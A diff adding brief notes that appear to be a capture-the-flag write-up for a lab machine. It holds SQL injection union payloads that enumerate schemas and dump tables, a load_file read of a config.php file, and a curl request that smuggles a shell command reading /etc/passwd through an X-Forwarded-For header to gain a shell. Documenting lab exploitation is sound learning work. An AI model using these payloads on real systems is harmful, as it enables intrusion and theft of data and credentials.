@@ -1,0 +1,29 @@
+we found sql injection
+
+parament we did player=ippsec'-- -   it said same name
+
+```
+player=pencer' union select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata -- -
+player=pencer' union select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA -- -
+
+player=pencer' union select group_concat('TABLE:',TABLE_NAME,'---->-COLUMN:',COLUMN_NAME,'\n') from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = 'november' -- -
+
+player=pencer' union select group_concat(player) from players -- -
+
+player=pencer' union select group_concat(one) from flag -- -
+```
+
+then we logged in using
+
+```
+player=pencer' union select load_file('/var/www/html/config.php')
+```
+
+on machine there was a file firewall.php
+
+it had x-forwsa-for so we did curl from our machine
+
+```
+curl -X GET -H 'X-FORWARDED-FOR: ;cat /etc/passwd;' --cookie "PHPSESSID=$PHPSESSID" 'http://10.10.11.128/firewall.php'
+and it had rce and got shell
+```
